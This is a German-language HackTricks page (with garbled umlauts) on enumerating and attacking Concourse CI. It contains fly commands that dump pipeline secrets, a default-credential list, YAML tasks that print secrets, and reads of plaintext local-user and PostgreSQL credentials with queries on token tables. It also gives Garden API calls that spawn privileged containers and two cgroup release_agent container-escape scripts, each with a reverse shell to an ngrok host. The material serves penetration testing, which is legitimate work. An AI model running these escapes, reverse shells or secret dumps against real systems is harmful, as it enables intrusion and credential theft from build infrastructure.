# Concourse Enumeration & Attacks

## Concourse Enumeration & Angriffe

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositorys einreichen.

</details>

### Benutzerrollen & Berechtigungen

Concourse wird mit f√ºnf Rollen geliefert:

* _Concourse_ **Admin**: Diese Rolle wird nur den Besitzern des **Hauptteams** (Standard-Initialteam von Concourse) zugewiesen. Admins k√∂nnen **andere Teams konfigurieren** (z. B.: `fly set-team`, `fly destroy-team`...). Die Berechtigungen dieser Rolle k√∂nnen nicht durch RBAC beeinflusst werden.
* **Besitzer**: Team-Besitzer k√∂nnen **alles innerhalb des Teams √§ndern**.
* **Mitglied**: Teammitglieder k√∂nnen innerhalb der **Team-Ressourcen lesen und schreiben**, k√∂nnen jedoch die Team-Einstellungen nicht √§ndern.
* **Pipeline-Betreiber**: Pipeline-Betreiber k√∂nnen **Pipeline-Operationen** wie das Ausl√∂sen von Builds und das Anheften von Ressourcen durchf√ºhren, k√∂nnen jedoch keine Pipeline-Konfigurationen aktualisieren.
* **Viewer**: Team-Viewer haben **"nur-Lese" Zugriff auf ein Team** und dessen Pipelines.

{% hint style="info" %}
Dar√ºber hinaus k√∂nnen die **Berechtigungen der Rollen Besitzer, Mitglied, Pipeline-Betreiber und Viewer ge√§ndert werden**, indem RBAC konfiguriert wird (indem die Aktionen spezifischer konfiguriert werden). Lesen Sie mehr dar√ºber unter: [https://concourse-ci.org/user-roles.html](https://concourse-ci.org/user-roles.html)
{% endhint %}

Beachten Sie, dass Concourse **Pipelines innerhalb von Teams gruppiert**. Daher k√∂nnen Benutzer, die einem Team angeh√∂ren, diese Pipelines verwalten, und **mehrere Teams** k√∂nnen existieren. Ein Benutzer kann mehreren Teams angeh√∂ren und in jedem von ihnen unterschiedliche Berechtigungen haben.

### Vars & Credential Manager

In den YAML-Konfigurationen k√∂nnen Werte mit der Syntax `((_source-name_:_secret-path_._secret-field_))` konfiguriert werden.\
[Aus den Dokumenten:](https://concourse-ci.org/vars.html#var-syntax) Der **Quellname ist optional**, und wenn er weggelassen wird, wird der [clusterweite Credential-Manager](https://concourse-ci.org/vars.html#cluster-wide-credential-manager) verwendet, oder der Wert kann [statisch bereitgestellt werden](https://concourse-ci.org/vars.html#static-vars).\
Das **optionale** _**secret-field**_ spezifiziert ein Feld im abgerufenen Geheimnis, das gelesen werden soll. Wenn es weggelassen wird, kann der Credential-Manager w√§hlen, ein 'Standardfeld' aus dem abgerufenen Credential zu lesen, wenn das Feld existiert.\
Dar√ºber hinaus k√∂nnen _**secret-path**_ und _**secret-field**_ von doppelten Anf√ºhrungszeichen `"..."` umgeben sein, wenn sie **Sonderzeichen** wie `.` und `:` enthalten. Zum Beispiel wird `((source:"my.secret"."field:1"))` den _secret-path_ auf `my.secret` und das _secret-field_ auf `field:1` setzen.

#### Statische Vars

Statische Vars k√∂nnen in **Task-Schritten** spezifiziert werden:

```yaml
- task: unit-1.13
file: booklit/ci/unit.yml
vars: {tag: 1.13}
```

Oder verwenden Sie die folgenden `fly` **Argumente**:

* `-v` oder `--var` `NAME=VALUE` setzt den String `VALUE` als Wert f√ºr die Variable `NAME`.
* `-y` oder `--yaml-var` `NAME=VALUE` analysiert `VALUE` als YAML und setzt es als Wert f√ºr die Variable `NAME`.
* `-i` oder `--instance-var` `NAME=VALUE` analysiert `VALUE` als YAML und setzt es als Wert f√ºr die Instanzvariable `NAME`. Siehe [Gruppierung von Pipelines](https://concourse-ci.org/instanced-pipelines.html), um mehr √ºber Instanzvariablen zu erfahren.
* `-l` oder `--load-vars-from` `FILE` l√§dt `FILE`, ein YAML-Dokument, das Zuordnungen von Variablennamen zu Werten enth√§lt, und setzt sie alle.

#### Credential Management

Es gibt verschiedene M√∂glichkeiten, wie ein **Credential Manager in einer Pipeline angegeben werden kann**, lesen Sie dazu unter [https://concourse-ci.org/creds.html](https://concourse-ci.org/creds.html).\
Dar√ºber hinaus unterst√ºtzt Concourse verschiedene Credential Manager:

* [Der Vault Credential Manager](https://concourse-ci.org/vault-credential-manager.html)
* [Der CredHub Credential Manager](https://concourse-ci.org/credhub-credential-manager.html)
* [Der AWS SSM Credential Manager](https://concourse-ci.org/aws-ssm-credential-manager.html)
* [Der AWS Secrets Manager Credential Manager](https://concourse-ci.org/aws-asm-credential-manager.html)
* [Kubernetes Credential Manager](https://concourse-ci.org/kubernetes-credential-manager.html)
* [Der Conjur Credential Manager](https://concourse-ci.org/conjur-credential-manager.html)
* [Caching von Anmeldeinformationen](https://concourse-ci.org/creds-caching.html)
* [Verbergen von Anmeldeinformationen](https://concourse-ci.org/creds-redacting.html)
* [Erneutes Abrufen fehlgeschlagener Abrufe](https://concourse-ci.org/creds-retry-logic.html)

{% hint style="danger" %}
Beachten Sie, dass wenn Sie **Schreibzugriff auf Concourse** haben, Sie Jobs erstellen k√∂nnen, um **diese Geheimnisse abzusch√∂pfen**, da Concourse darauf zugreifen k√∂nnen muss.
{% endhint %}

### Concourse Enumeration

Um eine Concourse-Umgebung aufzulisten, m√ºssen Sie zun√§chst **g√ºltige Anmeldeinformationen sammeln** oder einen **authentifizierten Token** wahrscheinlich in einer `.flyrc`-Konfigurationsdatei finden.

#### Anmeldung und aktuelle Benutzerenum

* Um sich anzumelden, m√ºssen Sie den **Endpunkt**, den **Teamnamen** (Standard ist `main`) und ein **Team, dem der Benutzer angeh√∂rt**, kennen:
* `fly --target example login --team-name my-team --concourse-url https://ci.example.com [--insecure] [--client-cert=./path --client-key=./path]`
* Erhalten Sie konfigurierte **Ziele**:
* `fly targets`
* √úberpr√ºfen Sie, ob die konfigurierte **Zielverbindung** noch **g√ºltig** ist:
* `fly -t <target> status`
* Erhalten Sie die **Rolle** des Benutzers gegen√ºber dem angegebenen Ziel:
* `fly -t <target> userinfo`

{% hint style="info" %}
Beachten Sie, dass das **API-Token** standardm√§√üig in `$HOME/.flyrc` gespeichert wird. Wenn Sie Maschinen pl√ºndern, k√∂nnten Sie dort die Anmeldeinformationen finden.
{% endhint %}

#### Teams & Benutzer

* Erhalten Sie eine Liste der Teams
* `fly -t <target> teams`
* Erhalten Sie Rollen innerhalb des Teams
* `fly -t <target> get-team -n <team-name>`
* Erhalten Sie eine Liste der Benutzer
* `fly -t <target> active-users`

#### Pipelines

* **Auflisten** von Pipelines:
* `fly -t <target> pipelines -a`
* **Abrufen** von Pipeline-YAML (**sensible Informationen** k√∂nnten in der Definition gefunden werden):
* `fly -t <target> get-pipeline -p <pipeline-name>`
* Erhalten Sie alle in der Pipeline **deklarierten Konfigurationsvariablen**
* `for pipename in $(fly -t <target> pipelines | grep -Ev "^id" | awk '{print $2}'); do echo $pipename; fly -t <target> get-pipeline -p $pipename -j | grep -Eo '"vars":[^}]+'; done`
* Erhalten Sie alle verwendeten **geheimen Namen der Pipelines** (wenn Sie einen Job erstellen/√§ndern k√∂nnen oder einen Container kapern k√∂nnen, k√∂nnten Sie sie abgreifen):

```bash
rm /tmp/secrets.txt;
for pipename in $(fly -t onelogin pipelines | grep -Ev "^id" | awk '{print $2}'); do
echo $pipename;
fly -t onelogin get-pipeline -p $pipename | grep -Eo '\(\(.*\)\)' | sort | uniq | tee -a /tmp/secrets.txt;
echo "";
done
echo ""
echo "ALL SECRETS"
cat /tmp/secrets.txt | sort | uniq
rm /tmp/secrets.txt
```

#### Container & Worker

* Liste **Worker**:
* `fly -t <target> workers`
* Liste **Container**:
* `fly -t <target> containers`
* Liste **Builds** (um zu sehen, was l√§uft):
* `fly -t <target> builds`

### Concourse Angriffe

#### Anmeldeinformationen Brute-Force

* admin:admin
* test:test

#### Geheimnisse und Parameter Enumeration

Im vorherigen Abschnitt haben wir gesehen, wie Sie alle **Geheimnisnamen und Variablen** erhalten k√∂nnen, die von der Pipeline verwendet werden. Die **Variablen k√∂nnen sensible Informationen enthalten** und der Name der **Geheimnisse wird sp√§ter n√ºtzlich sein, um zu versuchen, sie zu stehlen**.

#### Sitzung innerhalb eines laufenden oder k√ºrzlich ausgef√ºhrten Containers

Wenn Sie √ºber ausreichende Berechtigungen verf√ºgen (**Mitgliedsrolle oder h√∂her**), k√∂nnen Sie **Pipelines und Rollen auflisten** und einfach eine **Sitzung innerhalb des** `<Pipeline>/<Job>` **Containers** mit folgendem Befehl starten:

```bash
fly -t tutorial intercept --job pipeline-name/job-name
fly -t tutorial intercept # To be presented a prompt with all the options
```

Mit diesen Berechtigungen k√∂nnten Sie m√∂glicherweise:

* Die Geheimnisse im Container stehlen
* Versuchen, auf den Knoten zu entkommen
* Cloud-Metadaten-Endpunkt (vom Pod und vom Knoten aus, falls m√∂glich) aufz√§hlen/missbrauchen

#### Pipeline-Erstellung/√Ñnderung

Wenn Sie ausreichende Berechtigungen haben (Mitgliedsrolle oder h√∂her), k√∂nnen Sie neue Pipelines erstellen/√§ndern. √úberpr√ºfen Sie dieses Beispiel:

```yaml
jobs:
- name: simple
plan:
- task: simple-task
privileged: true
config:
# Tells Concourse which type of worker this task should run on
platform: linux
image_resource:
type: registry-image
source:
repository: busybox # images are pulled from docker hub by default
run:
path: sh
args:
- -cx
- |
echo "$SUPER_SECRET"
sleep 1000
params:
SUPER_SECRET: ((super.secret))
```

Mit der **√Ñnderung/Erstellung** einer neuen Pipeline k√∂nnen Sie Folgendes tun:

* **Geheimnisse stehlen** (indem Sie sie ausgeben oder in den Container gelangen und `env` ausf√ºhren)
* **Zum Knoten entkommen** (indem Sie ausreichend Berechtigungen erhalten - `privileged: true`)
* **Cloud-Metadaten-Endpunkt aufz√§hlen/missbrauchen** (vom Pod und vom Knoten aus)
* Die erstellte Pipeline **l√∂schen**

#### Benutzerdefinierte Aufgabe ausf√ºhren

Dies ist √§hnlich wie die vorherige Methode, aber anstatt eine ganz neue Pipeline zu √§ndern/zu erstellen, k√∂nnen Sie **einfach eine benutzerdefinierte Aufgabe ausf√ºhren** (was wahrscheinlich viel **unauff√§lliger** sein wird):

```yaml
# For more task_config options check https://concourse-ci.org/tasks.html
platform: linux
image_resource:
type: registry-image
source:
repository: ubuntu
run:
path: sh
args:
- -cx
- |
env
sleep 1000
params:
SUPER_SECRET: ((super.secret))
```

```bash
fly -t tutorial execute --privileged --config task_config.yml
```

#### Entkommen zum Knoten aus privilegierter Aufgabe

In den vorherigen Abschnitten haben wir gesehen, wie man **eine privilegierte Aufgabe mit Concourse ausf√ºhrt**. Dies gibt dem Container nicht genau den gleichen Zugriff wie das privilegierte Flag in einem Docker-Container. Zum Beispiel sehen Sie das Knoten-Dateisystemger√§t nicht in /dev, daher k√∂nnte die Flucht "komplexer" sein.

Im folgenden PoC werden wir den release\_agent verwenden, um mit einigen kleinen Modifikationen zu entkommen:

```bash
# Mounts the RDMA cgroup controller and create a child cgroup
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the memory cgroup controller, try change memory to rdma to fix it
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release


# CHANGE ME
# The host path will look like the following, but you need to change it:
host_path="/mnt/vda1/hostpath-provisioner/default/concourse-work-dir-concourse-release-worker-0/overlays/ae7df0ca-0b38-4c45-73e2-a9388dcb2028/rootfs"

## The initial path "/mnt/vda1" is probably the same, but you can check it using the mount command:
#/dev/vda1 on /scratch type ext4 (rw,relatime)
#/dev/vda1 on /tmp/build/e55deab7 type ext4 (rw,relatime)
#/dev/vda1 on /etc/hosts type ext4 (rw,relatime)
#/dev/vda1 on /etc/resolv.conf type ext4 (rw,relatime)

## Then next part I think is constant "hostpath-provisioner/default/"

## For the next part "concourse-work-dir-concourse-release-worker-0" you need to know how it's constructed
# "concourse-work-dir" is constant
# "concourse-release" is the consourse prefix of the current concourse env (you need to find it from the API)
# "worker-0" is the name of the worker the container is running in (will be usually that one or incrementing the number)

## The final part "overlays/bbedb419-c4b2-40c9-67db-41977298d4b3/rootfs" is kind of constant
# running `mount | grep "on / " | grep -Eo "workdir=([^,]+)"` you will see something like:
# workdir=/concourse-work-dir/overlays/work/ae7df0ca-0b38-4c45-73e2-a9388dcb2028
# the UID is the part we are looking for

# Then the host_path is:
#host_path="/mnt/<device>/hostpath-provisioner/default/concourse-work-dir-<concourse_prefix>-worker-<num>/overlays/<UID>/rootfs"

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent


#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```

{% hint style="warning" %}
Wie Sie vielleicht bemerkt haben, handelt es sich hierbei lediglich um einen [**regul√§ren release\_agent escape**](https://github.com/carlospolop/hacktricks-cloud/blob/de/pentesting-ci-cd/concourse-security/broken-reference/README.md), bei dem lediglich der Pfad des Befehls im Knoten ge√§ndert wird.
{% endhint %}

#### Entkommen zum Knoten aus einem Worker-Container

Ein regul√§rer release\_agent escape mit einer geringf√ºgigen √Ñnderung reicht daf√ºr aus:

```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -n 1`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```

#### Entkommen zum Knoten aus dem Web-Container

Auch wenn die Web-Container einige Verteidigungen deaktiviert haben, l√§uft er **nicht als ein gew√∂hnlicher privilegierter Container** (zum Beispiel **kannst du** **nicht mounten** und die **F√§higkeiten** sind sehr **begrenzt**, daher sind alle einfachen M√∂glichkeiten, um aus dem Container auszubrechen, nutzlos).

Es speichert jedoch **lokale Anmeldeinformationen im Klartext**:

```bash
cat /concourse-auth/local-users
test:test

env | grep -i local_user
CONCOURSE_MAIN_TEAM_LOCAL_USER=test
CONCOURSE_ADD_LOCAL_USER=test:test
```

Du kannst diese Anmeldeinformationen verwenden, um dich am Webserver anzumelden und einen privilegierten Container zu erstellen und zum Knoten zu entkommen.

In der Umgebung findest du auch Informationen zum Zugriff auf die PostgreSQL-Instanz, die Concourse verwendet (Adresse, Benutzername, Passwort und Datenbank sowie andere Informationen):

```bash
env | grep -i postg
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_ADDR=10.107.191.238
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_PORT=5432
CONCOURSE_RELEASE_POSTGRESQL_SERVICE_PORT_TCP_POSTGRESQL=5432
CONCOURSE_POSTGRES_USER=concourse
CONCOURSE_POSTGRES_DATABASE=concourse
CONCOURSE_POSTGRES_PASSWORD=concourse
[...]

# Access the postgresql db
psql -h 10.107.191.238 -U concourse -d concourse
select * from password; #Find hashed passwords
select * from access_tokens;
select * from auth_code;
select * from client;
select * from refresh_token;
select * from teams; #Change the permissions of the users in the teams
select * from users;
```

#### Ausnutzen des Garden-Dienstes - Kein echter Angriff

{% hint style="warning" %}
Dies sind nur einige interessante Notizen √ºber den Dienst, aber da er nur auf localhost lauscht, haben diese Notizen keinen Einfluss, den wir nicht bereits zuvor ausgenutzt haben.
{% endhint %}

Standardm√§√üig wird auf jedem Concourse-Worker ein [**Garden**](https://github.com/cloudfoundry/garden)-Dienst auf Port 7777 ausgef√ºhrt. Dieser Dienst wird vom Web-Master verwendet, um dem Worker anzuzeigen, **was er ausf√ºhren muss** (das Bild herunterladen und jede Aufgabe ausf√ºhren). Das klingt ziemlich gut f√ºr einen Angreifer, aber es gibt einige gute Schutzma√ünahmen:

* Es ist nur **lokal freigegeben** (127.0.0.1) und ich denke, wenn der Worker sich erneut beim Web mit dem speziellen SSH-Dienst authentifiziert, wird ein Tunnel erstellt, damit der Webserver mit jedem Garden-Dienst innerhalb jedes Workers **kommunizieren kann**.
* Der Webserver **√ºberwacht die laufenden Container alle paar Sekunden**, und **unerwartete** Container werden **gel√∂scht**. Wenn Sie also einen **benutzerdefinierten Container ausf√ºhren** m√∂chten, m√ºssen Sie die **Kommunikation** zwischen dem Webserver und dem Garden-Dienst **manipulieren**.

Concourse-Worker werden mit hohen Containerberechtigungen ausgef√ºhrt:

```
Container Runtime: docker
Has Namespaces:
pid: true
user: false
AppArmor Profile: kernel
Capabilities:
BOUNDING -> chown dac_override dac_read_search fowner fsetid kill setgid setuid setpcap linux_immutable net_bind_service net_broadcast net_admin net_raw ipc_lock ipc_owner sys_module sys_rawio sys_chroot sys_ptrace sys_pacct sys_admin sys_boot sys_nice sys_resource sys_time sys_tty_config mknod lease audit_write audit_control setfcap mac_override mac_admin syslog wake_alarm block_suspend audit_read
Seccomp: disabled
```

Jedoch werden Techniken wie das **Einbinden** des /dev-Ger√§ts des Knotens oder release\_agent **nicht funktionieren** (da das echte Ger√§t mit dem Dateisystem des Knotens nicht zug√§nglich ist, sondern nur ein virtuelles). Wir k√∂nnen nicht auf Prozesse des Knotens zugreifen, daher wird die Flucht aus dem Knoten ohne Kernel-Exploits kompliziert.

{% hint style="info" %}
Im vorherigen Abschnitt haben wir gesehen, wie man aus einem privilegierten Container fliehen kann, also wenn wir Befehle in einem **privilegierten Container** ausf√ºhren k√∂nnen, der vom **aktuellen** **Worker** erstellt wurde, k√∂nnten wir auf den Knoten **fliehen**.
{% endhint %}

Beachten Sie, dass ich beim Experimentieren mit Concourse festgestellt habe, dass, wenn ein neuer Container erstellt wird, um etwas auszuf√ºhren, die Containerprozesse vom Worker-Container aus zug√§nglich sind, sodass es ist, als ob ein Container einen neuen Container in seinem Inneren erstellt.

**Zugriff auf einen laufenden privilegierten Container**

```bash
# Get current container
curl 127.0.0.1:7777/containers
{"Handles":["ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

# Get container info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/properties

# Execute a new process inside a container
## In this case "sleep 20000" will be executed in the container with handler ac793559-7f53-4efc-6591-0171a0391e53
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
--header='Content-Type:application/json' \
'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'

# OR instead of doing all of that, you could just get into the ns of the process of the privileged container
nsenter --target 76011 --mount --uts --ipc --net --pid -- sh
```

**Erstellen eines neuen privilegierten Containers**

Sie k√∂nnen sehr einfach einen neuen Container erstellen (einfach eine zuf√§llige UID ausf√ºhren) und etwas darauf ausf√ºhren:

```bash
curl -X POST http://127.0.0.1:7777/containers \
-H 'Content-Type: application/json' \
-d '{"handle":"123ae8fc-47ed-4eab-6b2e-123458880690","rootfs":"raw:///concourse-work-dir/volumes/live/ec172ffd-31b8-419c-4ab6-89504de17196/volume","image":{},"bind_mounts":[{"src_path":"/concourse-work-dir/volumes/live/9f367605-c9f0-405b-7756-9c113eba11f1/volume","dst_path":"/scratch","mode":1}],"properties":{"user":""},"env":["BUILD_ID=28","BUILD_NAME=24","BUILD_TEAM_ID=1","BUILD_TEAM_NAME=main","ATC_EXTERNAL_URL=http://127.0.0.1:8080"],"limits":{"bandwidth_limits":{},"cpu_limits":{},"disk_limits":{},"memory_limits":{},"pid_limits":{}}}'

# Wget will be stucked there as long as the process is being executed
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
--header='Content-Type:application/json' \
'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'
```

Jedoch √ºberpr√ºft der Webserver alle paar Sekunden die laufenden Container, und wenn ein unerwarteter entdeckt wird, wird er gel√∂scht. Da die Kommunikation √ºber HTTP erfolgt, k√∂nnten Sie die Kommunikation manipulieren, um die L√∂schung unerwarteter Container zu vermeiden:

```
GET /containers HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
.

T 127.0.0.1:7777 -> 127.0.0.1:59722 [AP] #157
HTTP/1.1 200 OK.
Content-Type: application/json.
Date: Thu, 17 Mar 2022 22:42:55 GMT.
Content-Length: 131.
.
{"Handles":["123ae8fc-47ed-4eab-6b2e-123458880690","ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

T 127.0.0.1:59722 -> 127.0.0.1:7777 [AP] #159
DELETE /containers/123ae8fc-47ed-4eab-6b2e-123458880690 HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
```

## Referenzen

* https://concourse-ci.org/vars.html

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github Repositories einreichen.

</details>
